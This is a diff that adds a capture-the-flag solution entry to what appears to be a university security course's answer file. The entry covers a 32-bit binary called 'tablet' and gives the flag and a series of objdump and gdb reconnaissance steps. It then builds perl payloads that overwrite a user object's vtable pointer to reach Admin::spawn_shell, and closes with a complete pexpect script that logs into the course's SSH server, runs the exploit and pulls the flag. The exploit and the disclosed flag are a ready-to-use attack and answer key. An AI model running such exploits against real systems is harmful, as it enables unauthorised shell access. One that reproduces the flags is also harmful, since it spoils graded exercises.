@@ -512,3 +512,157 @@ print(output)
 p.close()
 
 -----------------------------------------------------------------------------------------------
+challenge #r0p
+solution: 2a640453aEE8AAED_all_your_vtables_are_belong_to_us
+hint:  nm ./tablet | grep -i admin -> 0804a9aa T _ZN5Admin11spawn_shellEv
+    file ./tablet -> ./tablet: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
+    dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=46b4eea88e841332dfe695d106d2d67e2a4c5b77, 
+    for GNU/Linux 3.2.0, not stripped
+    echo "help" | ./tablet -> 
+    Command list:
+  exit    : Terminates the session.
+  help    : Displays this message.
+  login   : Login as a different user.
+  logout  : Logout as the current user.
+  spawn   : Spawn a shell (privileged users only).
+  switch  : Switch to another logged in user.
+  users   : Displays all logged in users.
+  weather : Displays the current weather conditions.
+  whoami  : Displays current user info.
+
+  nm ./tablet | grep -E "Admin|User|_ZTV|spawn_shell|weather|display_info" | sort
+  -> 0804a966 T _ZN4User11spawn_shellEv
+    0804a9aa T _ZN5Admin11spawn_shellEv
+    0804dea8 V _ZTV5Admin
+    0804deb8 V _ZTV4User
+
+    readelf -S ./tablet | grep -E ".rodata|.data.rel.ro"
+    ->   [21] .data.rel.ro      PROGBITS        0804dea8 004ea8 000040 00  WA  0   0  4
+
+    objdump -s -j .data.rel.ro ./tablet ->
+    User object vptr = 0x0804dec0
+    Admin object vptr = 0x0804deb0
+
+    objdump -d --no-show-raw-insn ./tablet | sed -n '/<_Z14select_commandv>:/,/^$/p'
+    -> hint =  “virtually impossible” = virtual dispatch hijack.
+
+    objdump -s -j .rodata ./tablet | sed -n '/804c0d0/,/804c120/p' ->
+    Admin::spawn_shell τρέχει system("/bin/sh").
+
+    perl -e 'print "login\nA\nlogin\nB\nswitch\nA\nweather\nX\n";' > inp2.bin
+
+    gdb -q -nh -nx -batch ./tablet -ex 'set debuginfod enabled off' -ex 'set pagination off' -ex 'b 0x804a5bd' -ex 'run < /tmp/inp2.bin' -ex 'x/wx 0x804e130' -ex 'x/wx 0x804e0e0' -ex 'x/wx 0x804e0e4' -ex 'x/wx 0x804e0e8' -ex 'set $u1=(unsigned int*)0x804e0e4' -ex 'set $u2=(unsigned int)0x804e0e8' -ex 'x/32bx $u1' -ex 'x/32bx $u2'
+    users_num = 3 (guest, B, A)
+    Το A και B ήταν adjacent με απόσταση 0x20 bytes.
+
+    objdump -d --no-show-raw-insn ./tablet | sed -n '/<_ZN4User7weatherEv>:/,/^$/p'
+
+    perl -e 'print "login\nA\nlogin\nB\nswitch\nA\nweather\n"; print "C"x28; print "\xB0\xDE\x04\x08\n";' > inp3.bin
+
+    gdb -q -nh -nx -batch ./tablet \
+  -ex 'set debuginfod enabled off' \
+  -ex 'set pagination off' \
+  -ex 'b *0x804a5d6' \
+  -ex 'run < inp3.bin' \
+  -ex 'set $u2=*(unsigned int*)0x804e0e8' \
+  -ex 'x/wx $u2'
+    
+    perl -e 'print "login\nA\nlogin\nB\nswitch\nA\nweather\n"; print "C"x28; print "\xB0\xDE\x04\x08\n"; print "switch\nB\nspawn\n";' > inp4.bin
+
+gdb -q -nh -nx -batch ./tablet \
+  -ex 'set debuginfod enabled off' \
+  -ex 'set pagination off' \
+  -ex 'b *0x804a9aa' \
+  -ex 'b *0x804a966' \
+  -ex 'run < inp4.bin' \
+  -ex 'info break'
+
+    perl -e 'print "login\nA\nlogin\nB\nswitch\nA\nweather\n"; print "C"x28; print "\xB0\xDE\x04\x08\n"; print "switch\nB\nspawn\nexit\n";' > inp5.bin
+
+    strace -f -e execve ./tablet < inp5.bin
+
+    exploit.py:
+#!/usr/bin/env python3
+import re
+import sys
+
+import pexpect
+
+SSH_TARGET = "dimitriskaragiannis36@shell.hackintro25.di.uoa.gr"
+REMOTE_DIR = "/problems/8d10881cc153a4cd76617861455d9da6"
+PAYLOAD = "C" * 28 + "\xb0\xde\x04\x08"
+
+
+def main() -> int:
+    c = pexpect.spawn(f"ssh {SSH_TARGET}", encoding="latin-1", timeout=12)
+
+    try:
+        idx = c.expect(
+            [
+                r"\$ ",
+                r"Are you sure you want to continue connecting \(yes/no/\[fingerprint\]\)\?",
+            ]
+        )
+        if idx == 1:
+            c.sendline("yes")
+            c.expect(r"\$ ")
+
+        # Critical for sending raw bytes like 0x04/0x08 through TTY.
+        c.sendline("stty raw -echo")
+        c.expect(r"\$ ")
+
+        c.sendline(f"cd {REMOTE_DIR}")
+        c.expect(rf"{re.escape(REMOTE_DIR)}\$ ")
+
+        c.sendline("./tablet")
+        c.expect(r"guest@iTAB\$ ")
+
+        c.sendline("login")
+        c.expect("username: ")
+        c.sendline("A")
+        c.expect(r"A@iTAB\$ ")
+
+        c.sendline("login")
+        c.expect("username: ")
+        c.sendline("B")
+        c.expect(r"B@iTAB\$ ")
+
+        c.sendline("switch")
+        c.expect("username: ")
+        c.sendline("A")
+        c.expect(r"A@iTAB\$ ")
+
+        c.sendline("weather")
+        c.expect("ICAO code: ")
+        c.send(PAYLOAD + "\n")
+        c.expect(r"\$ ")
+
+        c.sendline("switch")
+        c.expect("username: ")
+        c.sendline("B")
+        c.expect(r"B@iTAB\$ ")
+
+        c.sendline("spawn")
+        c.sendline("cat flag")
+        c.sendline("echo ENDMARK")
+        c.expect("ENDMARK", timeout=5)
+
+        chunk = c.before
+        match = re.search(r"[A-Za-z0-9_{}-]{10,}", chunk)
+        if not match:
+            print("Could not extract flag.", file=sys.stderr)
+            print(chunk)
+            return 1
+
+        print("FLAG:", match.group(0))
+        return 0
+    finally:
+        try:
+            c.sendline("stty sane")
+        except Exception:
+            pass
+        c.close(force=True)
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
